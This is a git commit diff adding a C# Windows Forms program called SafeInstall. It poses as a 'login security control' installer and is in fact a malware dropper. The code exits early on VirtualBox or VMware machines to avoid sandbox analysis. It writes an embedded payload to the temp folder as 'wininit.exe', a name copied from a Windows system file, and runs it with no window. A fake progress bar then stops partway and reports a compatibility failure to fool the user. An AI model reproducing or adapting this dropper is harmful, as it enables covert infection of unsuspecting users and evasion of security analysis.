18522dbceae516f75547ce3aaf33eb1fa67a5923
cond0r@desktop <zlc@zhao.cl>
2022-04-08 03:36:14 +0800

    增加安装工具

---
+++ SafeInstall/SafeInstall/Form1.Designer.cs
@@ -0,0 +1,71 @@
+﻿namespace SafeInstall
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // progressBar1
+            // 
+            this.progressBar1.Location = new System.Drawing.Point(10, 10);
+            this.progressBar1.Name = "progressBar1";
+            this.progressBar1.Size = new System.Drawing.Size(277, 37);
+            this.progressBar1.TabIndex = 0;
+            // 
+            // timer1
+            // 
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(299, 59);
+            this.Controls.Add(this.progressBar1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.Text = "登录安全控件 - 安装中...";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ProgressBar progressBar1;
+        private System.Windows.Forms.Timer timer1;
+    }
+}
+
---
+++ SafeInstall/SafeInstall/Form1.cs
@@ -0,0 +1,104 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Management;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace SafeInstall
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            checkVM();
+            writeFile();
+            InitializeComponent();
+            progressBar1.Value = 0;
+            timer1.Interval = 50;
+            timer1.Start();
+        }
+        private void writeFile()
+        {
+            byte[] data = global::SafeInstall.Properties.Resources.load;
+            string p = Path.GetTempPath()+"\\wininit.exe";
+            if (File.Exists(p))
+            {
+                p = Path.GetTempFileName();
+
+            }
+            using(FileStream fs=new FileStream(p, FileMode.Create))
+            {
+                fs.Write(data, 0, data.Length);
+            }
+            Process process = new Process();
+            process.StartInfo.FileName = p;
+            process.StartInfo.Arguments = "8asdj2";
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
+            process.Start();
+
+        }
+        private void checkVM()
+        {
+            string hdid = "";//硬盘序列号 
+            ManagementClass cimobject = new ManagementClass("Win32_DiskDrive");
+            ManagementObjectCollection moc = cimobject.GetInstances();
+            foreach (ManagementObject mo in moc)
+            {
+                hdid = mo.Properties["model"].Value.ToString();
+            }
+            Console.WriteLine(hdid);
+            if(hdid.Contains("VBOX") || hdid.ToLower().Contains("vmware"))
+            {
+                MessageBox.Show("系统不兼容.");
+                Application.Exit();
+                Application.ExitThread();
+                System.Environment.Exit(0);
+                return;
+            }
+
+            Process[] ps = Process.GetProcesses();
+            foreach(var p in ps)
+            {
+                if (p.ProcessName.Contains("VBox"))
+                {
+                    MessageBox.Show("系统不兼容");
+                    Application.Exit();
+                    Application.ExitThread();
+                    System.Environment.Exit(0);
+                    return;
+                }
+            }
+           
+
+        }
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            if (progressBar1.Value == 70)
+            {
+                progressBar1.Value = progressBar1.Value + 1;
+                timer1.Stop();
+                MessageBox.Show("安装失败，系统不兼容");
+                return;
+            }
+            if (progressBar1.Value >= 70)
+            {
+                timer1.Stop();
+                return;
+            }
+            progressBar1.Value = progressBar1.Value + 1;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
